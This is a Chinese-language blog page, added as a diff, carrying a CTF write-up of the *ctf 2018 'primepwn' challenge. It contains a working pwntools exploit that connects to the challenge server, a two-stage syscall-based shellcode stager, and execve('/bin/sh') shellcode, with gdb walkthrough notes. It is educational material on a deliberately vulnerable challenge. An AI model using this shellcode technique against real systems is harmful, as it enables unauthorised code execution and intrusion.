@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。 赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwnhttps://github.com/sixstars/starctf2018/tree/mas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF中利用syscall写shellcode及*ctf primepwn writeup">
+<meta property="og:url" content="http://eternalsakura13.com/2018/04/27/star_primepwn/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="前言如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。 赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwnhttps://github.com/sixstars/starctf2018/tree/mas">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-050803.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-050747.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-051405.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-051440.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173228.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173323.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173521.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173438.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173715.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-071108.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173831.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173907.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-173943.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174015.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174142.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-071417.jpg">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174412.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174616.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174717.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174823.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-174852.png">
+<meta property="og:updated_time" content="2018-04-27T17:49:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF中利用syscall写shellcode及*ctf primepwn writeup">
+<meta name="twitter:description" content="前言如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。 赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwnhttps://github.com/sixstars/starctf2018/tree/mas">
+<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-27-050803.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2018/04/27/star_primepwn/"/>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <title>CTF中利用syscall写shellcode及*ctf primepwn writeup | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/04/27/star_primepwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF中利用syscall写shellcode及*ctf primepwn writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-27T13:03:26+08:00">
+                2018-04-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/其他/" itemprop="url" rel="index">
+                    <span itemprop="name">其他</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/04/27/star_primepwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/04/27/star_primepwn/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。</p>
+<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn</a><br><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn</a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">    .ascii &quot;Hello, world!\n&quot;</span><br><span class="line">    len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">    .global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq  $1, %rax</span><br><span class="line">    movq  $1, %rdi</span><br><span class="line">    movq  $msg, %rsi</span><br><span class="line">    movq  $len, %rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    movq  $60, %rax</span><br><span class="line">    xorq  %rdi, %rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></p>
+<p>输出结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./test</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure></p>
+<p>实际上这里是直接使用了write的syscall，它的系统调用号是1.<br>其他的syscall的系统调用号可以在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">系统调用表</a>查看。<br>我们可以看到我们在示例程序里用到的，1是write，60是exit退出程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1	common	write			sys_write</span><br><span class="line">60	common	exit			sys_exit</span><br></pre></td></tr></table></figure></p>
+<p>对于64位程序，通过syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p>
+<h3 id="syscall的trick"><a href="#syscall的trick" class="headerlink" title="syscall的trick"></a>syscall的trick</h3><p>syscall在所有寄存器都为0的情况下，执行的时候会把rip赋值给rcx。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050803.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050747.png" alt=""><br>首先输入一个unsigned long也就是8字节的数据，然后判定输入的数据(写到0x601038)是不是素数，如果不是素数，程序就结束掉，如果是素数，那么继续运行。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051405.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051440.png" alt=""><br>可以看到0x601030存放的是指向0x601038的指针。<br>之后程序会把寄存器都清零，然后跳到0x601030指向的空间执行，也就是跳到0x601038，执行我们写入的数据。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>为了方便读者自己调试分析，我就走一遍exp，然后描述一下利用过程。<br>exp如下，我加了一行gdb.attach用来调试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pwn_file=<span class="string">"./primepwn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    conn=process(pwn_file)</span><br><span class="line">    pid=conn.pid</span><br><span class="line">    gdb.attach(conn) <span class="comment"># 用作调试</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn=remote(<span class="string">"47.89.18.224"</span>,<span class="number">10008</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(prefix,s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>)</span><br><span class="line">    data=conn.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    prefix,s=parse(<span class="string">"sha256(xxxx+&#123;&#125;) == &#123;&#125;"</span>,data)</span><br><span class="line">    conn.sendline(brute_force(prefix,s))</span><br><span class="line">    pid=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    log.debug(<span class="string">"process pid:%d"</span>%pid)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,len(s),<span class="number">4</span>):</span><br><span class="line">        last=u32(s[i<span class="number">-4</span>:i])</span><br><span class="line">        now=u32(s[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> last &gt; now:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    mov esi,ecx</span></span><br><span class="line"><span class="string">    jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload=asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">conn.sendline(str(u64(payload)))</span><br><span class="line">log.debug(<span class="string">"sleep 20s"</span>)</span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">    mov rsp,rcx</span></span><br><span class="line"><span class="string">    add rsp,0x100</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    call get_shell</span></span><br><span class="line"><span class="string">    .ascii "/bin/sh"</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">get_shell:</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">conn.send(asm(code,arch=<span class="string">"amd64"</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>然后我们开始调试，如果你使用pwndbg插件，看到的应该和我一样。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173228.png" alt=""><br>这样我们就断在了main函数执行之前，我们的目的是进入main函数单步看exp执行.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173323.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173521.png" alt=""><br>所以我们按5次finish（finsh的作用是执行到当前函数结束返回）<br>现在你应该看到下面这样：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173438.png" alt=""><br>然后单步n，一直单步到main函数最后的jmp。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173715.png" alt=""></p>
+<p>由程序分析可知，首先我们要准备一个是素数的shellcode,且不能超过8个字节。<br>利用我们之前提到的syscall trick就可以做到，后面会分析为什么。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071108.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    syscall</span><br><span class="line">    dec edx</span><br><span class="line">    mov esi,ecx</span><br><span class="line">    jmp start</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A57 loc_400A57:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:0000000000400A57                 xor     rax, rax</span><br><span class="line">.text:0000000000400A5A                 xor     rbx, rbx</span><br><span class="line">.text:0000000000400A5D                 xor     rcx, rcx</span><br><span class="line">.text:0000000000400A60                 xor     rdx, rdx</span><br><span class="line">.text:0000000000400A63                 xor     rsi, rsi</span><br><span class="line">.text:0000000000400A66                 xor     rdi, rdi</span><br><span class="line">.text:0000000000400A69                 xor     rsp, rsp</span><br><span class="line">.text:0000000000400A6C                 xor     rbp, rbp</span><br><span class="line">.text:0000000000400A6F                 xor     r8, r8</span><br><span class="line">.text:0000000000400A72                 xor     r9, r9</span><br><span class="line">.text:0000000000400A75                 xor     r10, r10</span><br><span class="line">.text:0000000000400A78                 xor     r11, r11</span><br><span class="line">.text:0000000000400A7B                 xor     r12, r12</span><br><span class="line">.text:0000000000400A7E                 xor     r13, r13</span><br><span class="line">.text:0000000000400A81                 xor     r14, r14</span><br><span class="line">.text:0000000000400A84                 xor     r15, r15</span><br><span class="line">.text:0000000000400A87                 jmp     cs:qword_601030</span><br></pre></td></tr></table></figure>
+<p>由于在这里我们通过xor把寄存器都清空了，所以在执行syscall的时候，把rip的值赋给了rcx。<br>syscall执行前<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173831.png" alt=""><br>syscall执行后<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173907.png" alt=""><br>然后传递参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dec edx</span><br><span class="line">mov esi,ecx</span><br></pre></td></tr></table></figure></p>
+<p>edx从0减去1就是-1，即0xFFFFFFFF。<br>esi=ecx=rip。<br>rdi和eax在之前就已经被清零了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173943.png" alt=""><br>jmp跳到syscall执行，相当于调用sys_read(0,rip,0xFFFFFFFF)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174015.png" alt=""><br>sys_read执行结束后，0x60103a(即rip，也就是下一条要执行的命令)及其之后的指令被覆盖,如下图可以看到我们将继续执行真正的shellcode。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174142.png" alt=""></p>
+<p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071417.jpg" alt=""><br>将真正的shellcode读入到rip中，这样，继续执行就执行到了我们的shellcode。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code=&quot;&quot;&quot;</span><br><span class="line">    mov rsp,rcx</span><br><span class="line">    add rsp,0x100---&gt;这句可以删掉</span><br><span class="line">    mov rax,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    call get_shell</span><br><span class="line">    .ascii &quot;/bin/sh&quot;</span><br><span class="line">    .byte 0</span><br><span class="line">get_shell:</span><br><span class="line">    pop rdi</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>因为之前rsp被置0了，所以为了在栈上保存/bin/sh，用在后面pop rdi。<br>现在要让rsp指向一个可写的地址，于是把rcx赋值给它。<br>然后将execve的系统调用号赋值给rax。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3b		execve			sys_execve/ptregs</span><br></pre></td></tr></table></figure></p>
+<p>传递参数，执行execve(‘/bin/sh’,0,0)来getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174412.png" alt=""><br>注意在call的时候，会先把返回地址压栈，而返回地址就是下一条指令，也就是0x601056。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174616.png" alt=""><br>gdb里si跟入call的函数。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174717.png" alt=""><br>然后pop rdi就把参数传进去了，接着syscall就执行了execve(‘/bin/sh’,0,0)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174823.png" alt=""><br>getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174852.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/24/starctf_babystack/" rel="next" title="thread stack bypass canary和sixstar ctf babystack writeup">
+                <i class="fa fa-chevron-left"></i> thread stack bypass canary和sixstar ctf babystack writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/09/18/study/" rel="prev" title="Sakuraのdiary">
+                Sakuraのdiary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
